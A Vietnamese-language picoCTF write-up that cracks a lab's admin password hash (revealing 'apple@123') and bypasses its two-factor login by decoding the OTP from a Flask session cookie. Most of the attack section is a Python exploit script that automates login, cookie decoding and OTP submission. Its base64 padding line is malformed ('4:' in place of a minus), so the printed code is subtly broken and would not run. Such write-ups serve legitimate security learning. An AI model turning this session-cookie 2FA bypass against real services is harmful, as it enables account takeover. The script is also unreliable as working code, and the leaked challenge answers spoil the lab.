<img width="954" height="812" alt="image" src="https://github.com/user-attachments/assets/d9284017-3058-4562-a952-091f0ffcc700" />

Link : https://play.picoctf.org/practice/challenge/765?category=1&page=2&search=

Máy chủ : Window

APP hỗ trợ : VScode

Với bài này , tôi sẽ tập trung giải tìm flag bằng code để nó tự động request hệ thống . 

####  Chi tiết Luồng tấn công (Attack Flow)

Bước 1: Trinh sát và Thu thập thông tin (Reconnaissance)

Phân tích dữ liệu: Đề bài cung cấp file mã nguồn app.py và cơ sở dữ liệu users.db.

Khai thác Database: Mở file users.db bằng công cụ đọc SQLite ([https://sqliteviewer.app/](https://sqliteviewer.app/)) , kiểm tra bảng users và phát hiện tài khoản admin có mật khẩu đã bị băm (Hash SHA-256).

<img width="1771" height="966" alt="image" src="https://github.com/user-attachments/assets/b48b9351-4cfc-46ab-b073-210a5e9f2355" />

Bẻ khóa (Cracking): Copy chuỗi hash của admin và dán vào các từ điển giải mã online (như [CrackStation](https://crackstation.net/)). Kết quả trả về mật khẩu gốc là apple@123.

<img width="1518" height="875" alt="image" src="https://github.com/user-attachments/assets/81772d87-a494-4a0f-8c9a-15755feb11eb" />

Bước 2: Phân tích Mã nguồn (Source Code Analysis)

Kiểm tra file app.py, luồng đăng nhập diễn ra như sau:

Khi nhập đúng user/pass của admin, hệ thống tạo ra một mã OTP ngẫu nhiên gồm 4 chữ số.

<img width="861" height="543" alt="image" src="https://github.com/user-attachments/assets/e9777431-89f8-4de0-86ba-922b02adbdb8" />

Lỗ hổng chí mạng xuất hiện tại dòng: session['otp_secret'] = otp

Sau đó, hệ thống chuyển hướng (redirect) người dùng sang trang /two_fa để nhập mã.
Tuy nhiên, lúc này mã OTP đã được gói vào Cookie và nằm sẵn trên trình duyệt của người dùng.

Bước 3: Thực thi tấn công (Exploitation)

Kẻ tấn công không cần đoán mã OTP, mà chỉ cần bóc tách nó từ chính dữ liệu mà Server trả về.

Đăng nhập: Gửi yêu cầu POST tới /login với thông tin admin / apple@123.

Bắt Cookie (Intercept Cookie): Lấy giá trị của Cookie có tên là session từ phản hồi (Response) của máy chủ.

Định dạng Cookie của Flask: payload.thời_gian.chữ_ký

Nếu Cookie bắt đầu bằng dấu chấm ., nghĩa là payload đã bị nén bằng zlib.

Giải mã (Decoding):

Tách lấy phần payload (nằm trước dấu chấm phân cách).

Thêm các ký tự = vào cuối chuỗi để chuẩn hóa định dạng Base64.

Tiến hành giải mã Base64 (và giải nén Zlib nếu cần).

Trích xuất OTP: Sau khi giải mã, payload trả về một chuỗi JSON có chứa key "otp_secret". Đây chính là mã OTP chính xác.

Bypass 2FA: Gửi mã OTP vừa lấy được qua yêu cầu POST tới /two_fa và nhận về cờ (Flag).

#####  Mã khai thác tự động (Exploit Script) 

Để giải mã (decodecooktoOTP.py)  của tôi có nội dung sau :

import requests
import base64
import json
import re
import zlib  # Thêm thư viện giải nén

BASE_URL = "http://foggy-cliff.picoctf.net:Port mới của bạn/" 

ADMIN_PASSWORD = "apple@123"

def exploit_flask_session():
    s = requests.Session()
    
    
    print("[*] Bước 1: Đăng nhập để lấy Cookie...")
    login_data = {"username": "admin", "password": ADMIN_PASSWORD}
    res = s.post(f"{BASE_URL}/login", data=login_data)
    
    if res.status_code == 404:
        print("[-] Server sập! Hãy lên PicoCTF bật lại máy chủ và đổi link BASE_URL.")
        return
        
    session_cookie = s.cookies.get('session')
    if not session_cookie:
        print("[-] Lỗi: Không nhận được cookie session từ server.")
        return

    print(f"[+] Lấy Cookie thành công!\n    Mã Cookie: {session_cookie[:30]}...\n")
    
    print("[*] Bước 2: Giải mã Cookie (Đã thêm xử lý giải nén Zlib)...")
    
    # Kiểm tra xem cookie có bị nén hay không (bắt đầu bằng dấu '.')
    if session_cookie.startswith('.'):
        is_compressed = True
        payload = session_cookie.split('.')[1] # Bỏ qua dấu chấm đầu tiên, lấy phần thứ 2
    else:
        is_compressed = False
        payload = session_cookie.split('.')[0]
    
    # Bù thêm dấu '=' cho chuẩn định dạng Base64
    payload += "=" * ((4: len(payload) % 4) % 4)
    
    try:
        # 1. Giải mã Base64
        decoded_bytes = base64.urlsafe_b64decode(payload)
        
        # 2. Giải nén Zlib (nếu có)
        if is_compressed:
            decoded_bytes = zlib.decompress(decoded_bytes)
            
        # 3. Chuyển thành dạng từ điển (JSON)
        session_data = json.loads(decoded_bytes)
        
        print(f"[+] Bí mật bên trong Cookie là: {session_data}")
        
        real_otp = session_data.get('otp_secret')
        print(f"\n[!!!] KHÔNG CẦN ĐOÁN! MÃ OTP CHÍNH XÁC LÀ: {real_otp}")
        
    except Exception as e:
        print(f"[-] Lỗi giải mã: {e}")
        return

    print("\n[*] Bước 3: Gửi mã OTP lấy được lên Server...")
    verify_res = s.post(f"{BASE_URL}/two_fa", data={"otp": str(real_otp)})
    
    if "picoCTF{" in verify_res.text:
        flag = re.search(r'picoCTF\{.*?\}', verify_res.text)
        print("\n==============================")
        print("    🎯 HACK THÀNH CÔNG 🎯")
        print(f"    {flag.group(0)}")
        print("==============================")
    else:
        print("[-] Có lỗi xảy ra, không tìm thấy cờ!")
        print(verify_res.text)

if __name__ == "__main__":
    exploit_flask_session() 
    

#### Kết quả 

<img width="1450" height="355" alt="image" src="https://github.com/user-attachments/assets/ea7c3833-e3af-4e9b-bcc0-33692a9136ca" />

Flag hiển thị !!!

Cảm ơn các bạn đã đọc bài viết của tôi . Chúc mọi người giải thành công bài lab này và hiểu thêm kiến thức từ nó . Wish you have all the best!!!!!!!!!!!!

